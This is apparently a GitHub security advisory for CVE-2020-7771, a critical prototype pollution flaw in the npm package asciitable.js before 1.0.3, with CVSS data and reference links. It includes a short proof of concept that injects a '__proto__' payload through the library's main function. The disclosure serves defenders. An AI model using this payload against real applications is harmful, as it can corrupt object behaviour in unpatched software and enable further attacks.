# [C] Prototype Pollution in asciitable.js

## Summary
Severity: Critical
Advisory: GHSA-5pxj-mhwj-x5gv
CVE: CVE-2020-7771
CWE: CWE-400
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2021-04-13
Source: https://github.com/advisories/GHSA-5pxj-mhwj-x5gv
Type: github-advisory

## Affected
- npm: `asciitable.js` — affected >=0 <1.0.3

## Details
The package asciitable.js before 1.0.3 is vulnerable to Prototype Pollution via the main function.

### PoC
```js
var a = require("asciitable.js"); 
var b = JSON.parse('{"__proto__":{"test":123}}'); 
a({},b); 
console.log({}.test)
```

## References
- https://nvd.nist.gov/vuln/detail/CVE-2020-7771
- https://github.com/victornpb/asciitable.js/pull/1
- https://github.com/victornpb/asciitable.js/commit/8db8fc5ffa7a2a6e8596709d99b200afb53f40ab
- https://github.com/victornpb/asciitable.js
- https://snyk.io/vuln/SNYK-JS-ASCIITABLEJS-1039799
